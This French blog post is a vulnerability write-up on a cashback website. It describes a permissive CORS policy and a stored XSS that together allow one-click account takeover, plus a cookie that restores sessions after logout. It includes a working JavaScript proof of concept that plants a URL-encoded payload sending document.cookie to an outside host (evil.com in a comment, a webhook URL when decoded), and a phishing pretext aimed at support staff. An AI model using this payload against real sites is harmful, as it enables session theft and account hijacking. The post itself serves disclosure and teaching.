---
title: "Prise de contrôle d'un compte de cashback en un seul clic depuis n'importe quel site web"
description: 'Comment une série de mauvaises pratiques web m’a permis de prendre le contrôle de comptes en un seul clic sur un site web'
tags: ['CORS', 'XSS', 'ATO']
pubDate: '2026-02-03'
heroImage: '@/assets/images/prise-de-controle-dun-compte-en-un-seul-clic-sur-nimporte-quelle-site-web.png'
---

## Introduction

Imaginez être connecté à votre service de cashback préféré lorsque soudainement vous cliquez sur un site qui n’a absolument rien à voir avec celui-ci. Sans que vous ne vous en rendiez compte cette simple action permet à la personne contrôlant ce site web d’obtenir l'accès total à votre compte.

Ce scénario aussi improbable qu’il puisse paraître a pourtant été possible et à travers cet article je vais vous expliquer comment.

## Mes débuts avec l’application

Depuis plusieurs jours je me suis intéressé à une application française spécialisée dans le cashback. Au cours de mes premières analyses j’ai pu découvrir plusieurs vulnérabilités critiques, dont une **IDOR**, une **Open Redirect** combinée à une **XSS reflected**, ainsi qu’une **XSS stoked**.  
Ces failles mon notamment permis de voler les informations senssible des utilisateurs comme leurs IBAN ou de prendre le contrôle total de leurs comptes.

Ces découvertes une fois signalées et corrigées m’ont poussé à approfondir mes connaissances sur le fonctionnement interne de la plateforme.

Une question s’est alors imposée :  
*Comment l’application identifie-t-elle ses utilisateurs et valide-t-elle l’attribution du cashback ?*

## Une communication inter-sites excessivement permissive

Par défaut les sites web ne sont pas autorisés à communiquer entre eux pour des raisons de sécurité. Cette protection est mise en place par les navigateurs et s’appelle **CORS** ( Cross-Origin Resource Sharing ).

Au debut de mes reherche j’ai rapidement constaté que la configuration **CORS** utilisée par l’application était **particulièrement permissive**, autorisant des requêtes JavaScript provenant de domaines tiers et facilitant ainsi des échanges inter-sites risqués.

<figure class="text-center">
  <img
    src="/images/attack-on-cors.svg"
    alt="attack on cors"
    class="mx-auto"
  />
  <figcaption>
    Qu'est-ce que le CORS (Cross-Origin Resource Sharing) – <a href="https://portswigger.net/web-security/cors">portswigger.net</a>
  </figcaption>
</figure>

## Les fonctionnalités vulnérables

En analysant le parcours utilisateur classique pour accéder à du cashback via une boutique partenaire, deux points de terminaison ont rapidement attiré mon attention :

1. **https://disclosed.com/crossite/put_val/**  
   Cette URL prenait deux paramètres :
   - **member_id** : correspondant à la valeur du cookie de session de l’utilisateur
   - **uid** : une valeur pseudo-aléatoire

   À partir de ces valeurs, l’application créait un cookie nommé `crossite[member_id]` (avec **member_id** injecté dans le nom du cookie) et lui assignait comme valeur le contenu de **uid**.

   > Exemple :  
   > *https://disclosed.com/crossite/put_val/?member_id=dfalqsumqjfirtk86a2e68phkm&uid=6981065608542*  
   > crée le cookie **crossite6add22nupndc1leekfk7q33uip** avec la valeur **6981065608542**

2. **https://disclosed.com/crossite/get_val/**  
   Ce second endpoint renvoyait ensuite la valeur du cookie précédemment stocké, en se basant sur le paramètre **member_id**.

   > Exemple :  
   > *https://disclosed.com/crossite/get_val/?member_id=dfalqsumqjfirtk86a2e68phkm*  
   > retourne **6981065608542**

Le paramètre **uid** était particulièrement intéressant, car son contenu était directement reflété dans la réponse.  
J’ai donc injecté une balise `<script>alert(document.cookie)</script>` dans ce paramètre, puis appelé le second point de terminaison.

![account-takeover-in-one-click-xss-screenshoot](@/assets/images/account-takeover-in-one-click-xss-screenshoot.webp)

Cela a confirmé la présence d’une **XSS stockée**, la charge s’exécutant avec succès depuis la valeur du cookie.

## Scénario d’attaque

Un attaquant aurait pu cibler un compte disposant de permissions élevées, comme un compte de support, via un formulaire de contact dédié à chaque utilisateur.  
Il aurait par exemple prétexté qu’une redirection ne fonctionne plus, en indiquant un lien du type :  
`https://www.disclosed.com/redirection/marchand/amazon/`

Cette étape, bien que facultative, permettait de s’assurer que la victime était connectée et que son cookie de session soit exploitable.  
La victime pouvait ensuite être redirigée vers n’importe quel site contrôlé par l’attaquant, contenant la charge utile suivante :

```javascript
(async () => {
  // https://www.disclosed.com/crossite/put_val/?member_id=dfalqsumqjfirtk86a2e68phkm&uid=<script>document.write('<img src="https://evil.com/?c='+document.cookie+'" onerror=location="https://example.com" />')</script>

  await fetch(
    'https://www.disclosed.com/crossite/put_val/?member_id=dfalqsumqjfirtk86a2e68phkm&uid=%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%27%3c%69%6d%67%20%73%72%63%3d%22%68%74%74%70%73%3a%2f%2f%77%65%62%68%6f%6f%6b%2e%73%69%74%65%2f%61%38%39%63%34%66%36%66%2d%37%34%38%30%2d%34%64%38%62%2d%39%38%34%37%2d%34%62%61%34%38%63%61%64%39%65%65%33%3f%63%3d%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%2b%27%22%20%6f%6e%65%72%72%6f%72%3d%6c%6f%63%61%74%69%6f%6e%3d%22%68%74%74%70%73%3a%2f%2f%65%78%61%6d%70%6c%65%2e%63%6f%6d%22%20%2f%3e%27%29%3c%2f%73%63%72%69%70%74%3e',
    {
      method: 'GET',
      credentials: 'include',
      mode: 'cors',
    }
  );

  window.location.href = 'https://www.disclosed.com/crossite/get_val/?member_id=dfalqsumqjfirtk86a2e68phkm';
})();
```

A titre de preuve de concept j’ai pu valider la vulnérabilité par ce script qui dans un premier temps **enregistre un cookie empoisonné avec du code javascript** puis dans un second redirige l’utilisateur via _window.location.href_ vers la page **récupérant le code et l’exécutant par la même occasion**, tout ça de façon automatique.

## Persistance du contrôle d’accès

J’étais sur le point de publier cet article lorsque je me suis rendu compte d’une faille logique surprenante, aggravant encore l’impact de la prise de contrôle du compte.

Je pensais initialement que la session utilisateur reposait uniquement sur un cookie de session **PHPSESSID**.  
Pour rappel, un cookie de session n’existe que durant une session de navigation et est supprimé à la fermeture du navigateur.

Or, j’ai découvert qu’un autre cookie permettait de restaurer la session automatiquement, même si l’utilisateur se déconnecte, change son adresse email ou modifie son mot de passe.

## Conclusion

Cette attaque a été rendue possible par une mauvaise gestion du **CORS** et des cookies.  
Bien qu’elle nécessite une authentification préalable et que l’utilisateur clique sur au moins un lien de redirection vers une boutique affiliée, elle reste extrêmement dangereuse.

N’importe quel site web peut servir de vecteur d’attaque en hébergeant et exécutant une charge JavaScript de manière discrète, avant de rediriger la victime en une fraction de seconde.  
De plus, la persistance du contrôle permet de conserver l’accès au compte indépendamment des actions entreprises par l’utilisateur.

Dans ce contexte, il est quasiment impossible pour un utilisateur de s’en prémunir seul.
